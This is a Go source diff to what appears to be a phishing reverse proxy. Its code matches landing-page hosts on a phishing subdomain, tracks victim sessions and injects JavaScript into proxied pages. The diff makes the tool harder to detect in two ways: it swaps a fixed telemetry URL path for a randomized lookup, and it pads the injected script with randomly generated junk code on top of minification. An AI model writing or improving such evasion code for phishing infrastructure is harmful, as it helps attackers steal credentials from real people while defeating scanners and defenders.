@@ -294,12 +294,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			// Crawlfence telemetry endpoint
-			cf_re := regexp.MustCompile("^\\/cf\\/([^\\/]+)$")
-			if cf_re.MatchString(req.URL.Path) {
-				ra := cf_re.FindStringSubmatch(req.URL.Path)
-				if len(ra) >= 2 {
-					session_id := ra[1]
+			// Crawlfence telemetry endpoint (randomized path lookup)
+			cf_session_id := p.crawlfence.LookupEndpoint(req.URL.Path)
+			if cf_session_id != "" {
+				{
+					session_id := cf_session_id
 					if s, ok := p.sessions[session_id]; ok {
 						if req.Method == "POST" {
 							body, err := io.ReadAll(req.Body)
@@ -1304,7 +1303,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if ok {
 											landingHost := combineHost(ph.phish_subdomain, phishDomain)
 											if resp.Request.Host == landingHost {
-												cfScript := GenerateCrawlfenceScript(s.Id)
+												cfScript := GenerateCrawlfenceScript(p.crawlfence, s.Id)
 												body = p.injectJavascriptIntoBody(body, cfScript, "")
 												log.Debug("crawlfence: injected telemetry script for session: %s", s.Id)
 												break
@@ -1499,13 +1498,12 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	if script != "" {
 		minifier := minify.New() // "github.com/tdewolff/minify/js"
 		minifier.AddFunc("text/javascript", js.Minify)
+		junkCode := generateRandomJunkCode()
 		obfuscatedScript, err := minifier.String("text/javascript", script)
 		if err != nil {
-			// Handle error - obfuscation failed yall
-			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+			d_inject = "<script" + js_nonce + ">" + junkCode + script + "</script>\n${1}"
 		}
-		d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
-		//d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		d_inject = "<script" + js_nonce + ">" + junkCode + obfuscatedScript + "</script>\n${1}"
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
